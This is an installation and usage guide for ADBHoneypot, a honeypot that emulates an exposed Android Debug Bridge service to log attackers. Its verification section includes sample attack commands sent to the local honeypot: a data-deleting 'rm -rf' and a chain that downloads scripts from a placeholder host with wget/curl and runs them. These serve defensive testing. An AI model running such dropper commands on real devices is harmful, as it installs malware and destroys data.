# Installation guide (on Ubuntu 16.04)

- [Installation guide (on Ubuntu 16.04)](#installation-guide-on-ubuntu-1604)
  - [Step 1: Install dependencies](#step-1-install-dependencies)
  - [Step 2: Create a user account](#step-2-create-a-user-account)
  - [Step 3: Checkout the code](#step-3-checkout-the-code)
  - [Step 4: Setup Virtual Environment](#step-4-setup-virtual-environment)
  - [Step 5: Install configuration file](#step-5-install-configuration-file)
  - [Step 6: Starting ADBHoneypot](#step-6-starting-adbhoneypot)
  - [Configure Additional Output Plugins (OPTIONAL)](#configure-additional-output-plugins-optional)
  - [Command-line options](#command-line-options)
  - [Log rotation](#log-rotation)
  - [Verifying that the honeypot works](#verifying-that-the-honeypot-works)
  - [Upgrading ADBHoneypot](#upgrading-adbhoneypot)

## Step 1: Install dependencies

First we install system-wide support for Python virtual environments and other
dependencies. Actual Python packages are installed later.

For a Python2-based environment:

```bash
sudo apt-get install git python-virtualenv libffi-dev build-essential libpython-dev python2.7-minimal python-dev libmysqlclient-dev
```

## Step 2: Create a user account

It's strongly recommended to run with a dedicated non-root user id:

```bash
$ sudo adduser --disabled-password adbh
Adding user 'adbh' ...
Adding new group 'adbh' (1002) ...
Adding new user 'adbh' (1002) with group 'adbh' ...
Changing the user information for adbh
Enter the new value, or press ENTER for the default
Full Name []:
Room Number []:
Work Phone []:
Home Phone []:
Other []:
Is the information correct? [Y/n]

$ sudo su - adbh
```

## Step 3: Checkout the code

```bash
$ git clone https://gitlab.com/venetay/adbhoneypot.git
Cloning into 'adbhoneypot'...
remote: Enumerating objects: 58, done.
remote: Counting objects: 100% (58/58), done.
remote: Compressing objects: 100% (40/40), done.
Uremote: Total 58 (delta 19), reused 47 (delta 13)npacking objects:  27% (16/58)
Unpacking objects: 100% (58/58), done.

$ cd adbhoneypot
```

## Step 4: Setup Virtual Environment

Next you need to create your virtual environment:

```bash
$ pwd
/home/adbh/adbhoneypot
$ virtualenv --python=python2 adbh_env
New python executable in ./adbh_env/bin/python
Installing setuptools, pip, wheel...done.
```

Activate the virtual environment and install packages

```bash
$ source adbh_env/bin/activate
(adbh_env) $ pip install --upgrade pip
(adbh_env) $ pip install --upgrade -r requirements.txt
```

## Step 5: Install configuration file

The configuration for the honeypot is stored in `etc/adbhoney.cfg.base` and
`etc/adbhoney.cfg`. Both files are read on startup but the entries from
`etc/adbhoney.cfg` take precedence. The `.base` file contains the default
settings and can be overwritten by upgrades, while `adbhoney.cfg` will not be
touched. To run with a standard configuration, there is no need to change
anything.

For instance, in order to enable JSON logging, and to store the captured
samples in a directory named `dl`, create `etc/adbhoney.cfg` and put in it
only the following:

```adbhoney.cfg
[honeypot]
download_path = dl

[output_jsonlog]
enabled = true
logfile = log/adbhoney.json
epoch_timestamp = true
```

For more information about how to configure additional output plugins (from
the available ones), please consult the appropriate `README.md` file in the
subdirectory corresponding to the plugin inside the `docs` directory.

## Step 6: Starting ADBHoneypot

Before starting the honeypot, make sure that you have specified correctly
where it should look for the virtual environment. This documentation suggests
that you create it in `/home/adbh/adbhoneypot/adbh_env/`. If you have indeed
created it there, there is no need to change anything. If, however, you have
created it elsewhere, you have to do the following:

- Make a copy of the file `adbhoney-launch.cfg.base`:

```bash
$ pwd
/home/adbh/adbhoneypot
cd etc
cp adbhoney-launch.cfg.base adbhoney-launch.cfg
cd ..
```

- Edit the file `/home/adbh/adbhoneypot/etc/adbhoney-launch.cfg` and change the
  setting of the variable `ADB_VIRTUAL_ENV` to point to the directory where your
  virtual environment is.

Now you can launch the honeypot:

```bash
$ pwd
/home/adbh/adbhoneypot
./bin/adbhoney start
Starting ADBhoneypot ...
ADBhoneypot is started successfully.
```

## Configure Additional Output Plugins (OPTIONAL)

ADBHoneypot automatically outputs event data to text in `log/adbhoney.log`.
Additional output plugins can be configured to record the data other ways.
Supported output plugins include:

- JSON
- SQL (MySQL, SQLite3)

More plugins are likely to be added in the future.

See `docs/[Output Plugin]/README.md` for details.

## Command-line options

ADBHoneypot supports the following command-line options:

```options
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -a ADDR, --addr ADDR  Address to bind to (default: 0.0.0.0)
  -p PORT, --port PORT  Port to listen on (default: 5555)
  -d DLFOLDER, --dlfolder DLFOLDER
                        Directory for the uploaded samples (default: current)
  -l LOGFILE, --logfile LOGFILE
                        Log file (default: stdout)
  -s SENSOR, --sensor SENSOR
                        Sensor name (default: `hostname`)
  -b, --debug           Produce verbose output
```

The settings specified via command-line options take precedence over the
corresponding settings in the `.cfg` files.

## Log rotation

You can use the system utility `logrotate` to rotate the logs. For instance,
in order to keep one day worth of text and JSON logs for up to a year, create
a file `~/adbhoneypot/logrotate.conf` with the following contents:

```logrotate
/home/adbh/adbhoneypot/log/adbhoney.log {
        daily
        nocompress
        dateext
        dateyesterday
        dateformat .%Y-%m-%d
        notifempty
        rotate 356
}

/home/adbh/adbhoneypot/log/adbhoney.json {
        daily
        nocompress
        dateext
        dateyesterday
        dateformat .%Y-%m-%d
        notifempty
        rotate 356
}
```

Change the log directory and file names above if you haven't used the default
values.

Then create a crontab job (`crontab -e`) to run logrotate daily:

```crontab
@daily /usr/sbin/logrotate -s /home/adbh/adbhoneypot/logrotate.status /home/adbh/adbhoneypot/logrotate.conf
```

A future version of the honeypot is likely to do log rotation itself, instead
of relying on an external utility.

## Verifying that the honeypot works

- From a user who can `sudo` (i.e., not from `adbh`), make sure that `adb` is installed:

```bash
sudo apt-get update
sudo apt-get install adb
```

(If installing `adb` from the package `adb` does not work for some reason, install
it from the package `android-tools-adb`.)

- Switch to the user `adbh` and start the honeypot:

```bash
sudo su - adbh
cd adbhoneypot
./bin/adbhoney start
```

- Open a new terminal and scan `localhost`:

```bash
nmap -p 5555 127.0.0.1
```

This should result in a log entry that a connection has been made and then closed.

- Connect to the honeypot via `adb`:

```bash
$ adb connect 127.0.0.1:5555
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
connected to 127.0.0.1:5555

$ adb devices
List of devices attached
emulator-5554	device
127.0.0.1:5555	device
```

- Send a file to the honeypot:

```bash
$ adb -s 127.0.0.1:5555  push -p filename /sdcard/
Transferring: 5078064/5078064 (100%)
4805 KB/s (5078064 bytes in 1.031s)
```

The honeypot should log the file transfer and save a copy of the file
in the download directory.

- Execute shell commands on the honeypot:

```bash
adb -s 127.0.0.1:5555 shell "rm -rf /data/local/tmp/*"
adb -s 127.0.0.1:5555 shell "cd /data/local/tmp;wget http://yyy.yyy.yyy.yyy/br -O- >br;sh br;busybox wget http://yyy.yyy.yyy.yyy/r -O- >r;sh r;curl http://yyy.yyy.yyy.yyy/c >c;sh c;busybox curl http://yyy.yyy.yyy.yyy/bc >bc;sh bc"
```

The log file should reflect the attempts to run these commands.

## Upgrading ADBHoneypot

Updating is an easy process. First stop your honeypot. Then fetch any
available updates from the repository. As a final step upgrade your Python
dependencies:

```bash
./bin/adbhoney stop
git pull
pip install --upgrade -r requirements.txt
./bin/adbhoney start
```